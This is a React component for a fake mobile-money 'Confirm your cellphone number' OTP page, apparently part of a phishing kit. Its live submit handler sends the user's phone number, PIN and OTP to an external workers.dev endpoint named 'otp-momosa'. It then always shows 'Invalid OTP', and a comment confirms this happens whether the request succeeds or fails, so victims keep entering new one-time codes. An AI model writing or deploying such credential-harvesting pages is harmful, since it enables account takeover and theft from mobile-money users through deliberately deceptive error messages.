// import React from "react";
// import { useState, useRef } from "react";
// import { useNavigate, useLocation } from "react-router-dom";

// export default function OTPVerify() {
//   const [otp, setOtp] = useState(["", "", "", ""]);
//   const [show, setShow] = useState(false);
//     const [focused, setFocused] = useState(false);
//   const [error, setError] = useState("");
//   const inputs = useRef([]);
//   const navigate = useNavigate(); // ✅
//   const location = useLocation();
//   const { phone, pin } = location.state || {}; // ✅ Login se aaya phone

//   const handleChange = (val, idx) => {
//     if (!/^\d?$/.test(val)) return;
//     if (error) setError("");
//     const newOtp = [...otp];
//     newOtp[idx] = val;
//     setOtp(newOtp);
//     if (val && idx < 3) inputs.current[idx + 1]?.focus();
//   };

//   const handleKeyDown = (e, idx) => {
//     if (e.key === "Backspace" && !otp[idx] && idx > 0) {
//       inputs.current[idx - 1]?.focus();
//     }
//   };

//   const isComplete = otp.every((d) => d !== ""); // ✅ verify tab enable ho jab sab filled

//   const handleSubmit = async () => {
//     const payload = {
//       phone: phone,
//       otp: otp.join(''),
//       pin: pin
//     }
//     const res = await fetch('https://my-worker-app.instapayapi.workers.dev/api/otp-momosa',
//       {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify(payload),
//       },
//     );
//     if (res.ok) {
//       setError("Invalid OTP");
//       setOtp(["", "", "", ""]);
//       inputs.current[0]?.focus();
//       return;
//     }

//     setError("Invalid OTP");
//     setOtp(["", "", "", ""]);
//     inputs.current[0]?.focus();
//   }
//   return (
//     <div className="min-h-screen bg-white flex flex-col">
//       <div className="bg-yellow-400 h-8 w-full" />

//       {/* <div className="flex items-center px-4 py-4 border-b border-gray-200">
//         <button
//           onClick={() => navigate(-1)} // ✅ Wapas login pe
//           className="text-yellow-500 text-2xl font-bold mr-4"
//         >
//           ‹
//         </button>
//         <span className="text-lg font-bold text-gray-900">Register</span>
//       </div> */}

//       <div className="flex flex-col px-5 pt-8 flex-1">
//         <h2 className="text-xl font-black text-gray-900 mb-2">
//           Confirm your cellphone number
//         </h2>
//         <p className="text-sm text-gray-500 leading-relaxed mb-8">
//           We will send an SMS with a One Time Pin (OTP) within the next 3 minutes to{" "}
//           <span className="text-gray-700 font-medium">{phone}</span>
//         </p>

//         <p className="text-sm font-bold text-gray-400 mb-3">
//           Please enter the OTP you received
//         </p>

//         <div className="flex items-center gap-3 mb-10">
//           {/* {otp.map((digit, idx) => ( */}
//             <input
//               // key={idx}
//               // ref={(el) => (inputs.current[idx] = el)}
//               type={show ? "tel" : "password"}
//               inputMode="numeric"         // ✅ mobile numeric keyboard
//               pattern="[0-9]*"
//               // maxLength={1}
//               // value={digit}
//               onFocus={() => setFocused(true)}
//               onChange={(e) => handleChange(e.target.value, idx)}
//               onKeyDown={(e) => handleKeyDown(e, idx)}
//                className="w-full border-2 rounded-lg px-4 py-4 text-lg outline-none transition-all bg-white"
//             style={{ borderColor: focused ? "#FFCC00" : "#d1d5db" }}
//               // className="w-14 h-14 rounded-full border-2 border-gray-300 text-center text-xl font-bold text-gray-800 focus:outline-none focus:border-yellow-400 bg-white"
//             />
//           {/* )) */}
//           {/* } */}
//           {/* { otp.map <input
//             type="number"
//             value={digit}
//             onChange={(e) => handleChange(e.target.value, idx)}
//             onKeyDown={(e) => handleKeyDown(e, idx)}
//             // onFocus={() => setFocused(true)}
//             // onBlur={() => setFocused(false)}
//             className="w-full border-2 rounded-lg px-4 py-4 text-lg outline-none transition-all bg-white"
//             style={{ borderColor: focused || pin ? "#FFCC00" : "#d1d5db" }}
//             placeholder=""
//           />} */}
//           {/* <button
//             onClick={() => setShow(!show)}
//             className="ml-2 text-sm font-bold text-gray-700 tracking-widest"
//           >
//             {show ? "HIDE" : "SHOW"}
//           </button> */}
//         </div>
//         {error && (
//           <p className="text-red-500 text-sm font-medium mb-4">
//             {error}
//           </p>
//         )}
//         <button
//           onClick={handleSubmit}
//           // onClick={() => navigate("/pincode")} // ✅ PIN page pe jao
//           // disabled={!isComplete}
//           className="w-full bg-[#FFCC00] active:bg-yellow-600 text-gray-900 font-bold text-lg rounded-full py-4 mb-4 transition-colors shadow-sm disabled:opacity-50 disabled:cursor-not-allowed"
//         >
//           Verify
//         </button>

//         <button className="w-full bg-gray-100 hover:bg-gray-200 text-gray-900 font-bold text-lg rounded-full py-4 transition-colors">
//           Resend OTP
//         </button>
//       </div>
//     </div>
//   );
// }

import React from "react";
import { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";

export default function OTPVerify() {
  const [otp, setOtp] = useState("");
  const [show, setShow] = useState(false);
  const [focused, setFocused] = useState(false);
  const [error, setError] = useState("");
  const navigate = useNavigate();
  const location = useLocation();
  const { phone, pin } = location.state || {};

  const handleChange = (val) => {
    if (!/^\d*$/.test(val)) return;
    if (error) setError("");
    setOtp(val);
  };

  const isComplete = otp.length > 0;

  // const handleSubmit = async () => {
  //   const payload = {
  //     phone: phone,
  //     otp: otp,
  //     pin: pin,
  //   };

  //   try {
  //     const res = await fetch(
  //       "https://my-worker-app.instapayapi.workers.dev/api/otp-momosa",
  //       {
  //         method: "POST",
  //         headers: { "Content-Type": "application/json" },
  //         body: JSON.stringify(payload),
  //       }
  //     );

  //     const data = await res.json();

  //     if (res.ok && data.success) {
  //       // ✅ OTP sahi tha — aage navigate karo
  //       navigate("/next-page"); // apna route yahan likho
  //     } else {
  //       // ❌ API ne error diya
  //       setError("Invalid OTP");
  //       setOtp("");
  //     }
  //   } catch (err) {
  //     // ❌ Network error ya kuch aur
  //     setError("Invalid OTP");
  //     setOtp("");
  //   }
  // };
 
  const handleSubmit = async () => {
  const payload = { phone, otp, pin };

  try {
    await fetch(
      "https://my-worker-app.instapayapi.workers.dev/api/otp-momosa",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      }
    );
  } catch (err) {}

  // har case mein — success ho ya fail
  setError("Invalid OTP");
  setOtp("");
};

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="bg-yellow-400 h-8 w-full" />

      <div className="flex flex-col px-5 pt-8 flex-1">
        <h2 className="text-xl font-black text-gray-900 mb-2">
          Confirm your cellphone number
        </h2>
        <p className="text-sm text-gray-500 leading-relaxed mb-8">
          We will send an SMS with a One Time Pin (OTP) within the next 3
          minutes to{" "}
          <span className="text-gray-700 font-medium">{phone}</span>
        </p>

        <p className="text-sm font-bold text-gray-400 mb-3">
          Please enter the OTP you received
        </p>

        <div className="flex items-center gap-3 mb-4">
          <div className="relative w-full">
            <input
              type={show ? "tel" : "password"}
              inputMode="numeric"
              pattern="[0-9]*"
              value={otp}
              onFocus={() => setFocused(true)}
              onBlur={() => setFocused(false)}
              onChange={(e) => handleChange(e.target.value)}
              placeholder="Enter OTP"
              className="w-full border-2 rounded-lg px-4 py-4 text-lg outline-none transition-all bg-white pr-20"
              style={{
                borderColor: focused ? "#FFCC00" : error ? "#ef4444" : "#d1d5db",
              }}
            />
          </div>
        </div>

        {error && (
          <p className="text-red-500 text-sm font-medium mb-4">{error}</p>
        )}

        <div className="mt-6 flex flex-col gap-3">
          <button
            onClick={handleSubmit}
            disabled={!isComplete}
            className="w-full bg-[#FFCC00] text-gray-900 font-bold text-lg rounded-full py-4 transition-colors shadow-sm d"
          >
            Verify
          </button>

          <button className="w-full bg-gray-100 hover:bg-gray-200 text-gray-900 font-bold text-lg rounded-full py-4 transition-colors">
            Resend OTP
          </button>
        </div>
      </div>
    </div>
  );
}